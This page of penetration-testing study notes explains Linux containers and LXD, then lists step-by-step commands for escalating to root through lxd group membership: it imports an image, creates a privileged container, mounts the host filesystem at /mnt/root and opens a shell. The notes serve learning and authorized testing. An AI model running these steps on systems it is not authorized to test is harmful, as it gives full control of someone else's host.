# Containers

{% hint style="info" %}
Containers operate at the operating system level and virtual machines at the hardware level. Containers thus share an operating system and isolate application processes from the rest of the system, while classic virtualization allows multiple operating systems to run simultaneously on a single system.
{% endhint %}

### Linux Containers (LXC) <a href="#linux-containers" id="linux-containers"></a>

* Linux Containers (`LXC`) is an operating system-level virtualization technique that allows multiple Linux systems to run in isolation from each other on a single host by owning their own processes but sharing the host system kernel for them.

### Linux Daemon (LXD)

* Linux Daemon ([LXD](https://github.com/lxc/lxd)) is similar in some respects but is designed to contain a complete operating system. Thus it is not an application container but a system container. Before we can use this service to escalate our privileges, we must be in either the `lxc` or `lxd` group.
* LXD is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group.
* Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at `/mnt/root`&#x20;

## Privilege Escalation

### Exploit LXC/LXD

* [digitalocean-howtosetupanduselxdonubuntu](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04)
* Verify if we are part of `lxc` or `lxd` group.
  * `id` -> `uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)`  <sup><sub>(Sample Output)<sub></sup>
* `unzip alpine.zip` -> `lxd init`&#x20;
* `lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine` <sup><sub>(Import the local image)<sub></sup> **(OR)**\
  `lxc image import ubuntu-template.tar.xz --alias ubuntutemp` &#x20;
* `lxc image list`&#x20;
* `lxc init alpine r00t -c security.privileged=true`  <sup><sub>(Start a privileged container with the<sub></sup> <sup><sub> </sup><sup><sub>`security.privileged`<sub></sup> <sup><sub> </sup><sup><sub>set to<sub></sup> <sup><sub> </sup><sup><sub>`true`<sub></sup> <sup><sub> </sup><sup><sub>to run the container without a UID mapping, making the root user in the container the same as the root user on the host)<sub></sup> \
  &#xNAN;**(OR)**\
  `lxc init ubuntutemp privesc -c security.privileged=true`&#x20;
* `lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true`\
  <sup><sub>(Mount the host file system)<sub></sup>\
  &#xNAN;**(OR)**\
  `lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true`
* `lxc start privesc` -> `lxc exec privesc /bin/bash`  \
  &#xNAN;**(OR)**\
  `lxc start r00t` -> `lxc exec r00t /bin/sh`&#x20;
